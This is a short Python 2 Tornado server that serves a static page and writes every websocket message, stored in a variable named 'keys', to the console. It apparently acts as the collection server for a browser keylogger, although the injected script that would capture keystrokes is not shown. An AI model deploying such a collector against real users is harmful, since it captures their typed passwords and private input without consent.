import tornado.ioloop
import tornado.web
import tornado.websocket
import tornado.template
#import uuid
import sys

from tornado.options import define, options, parse_command_line

define("port", default=8888, help="run on the given port", type=int)

class WSHandler(tornado.websocket.WebSocketHandler):
	clients = []

	def open(self):
		self.clients.append(self)
		print '[+] New Connection:', self

	def on_message(self, message):
		keys = message.encode("utf8")

		sys.stdout.write(keys)
		sys.stdout.flush()

	def on_close(self):
		self.clients.remove(self)
		print '[+] Connection closed'

if __name__ == "__main__":

	app = tornado.web.Application([
		(r'/ws', WSHandler),
		(r"/()$", tornado.web.StaticFileHandler, {'path':'./static/index.html'}),
		(r"/(.*)", tornado.web.StaticFileHandler, {'path':'./static/'}),
	])
	parse_command_line()
	app.listen(options.port)

	print "[+] Listening on port: ", options.port
	tornado.ioloop.IOLoop.current().start()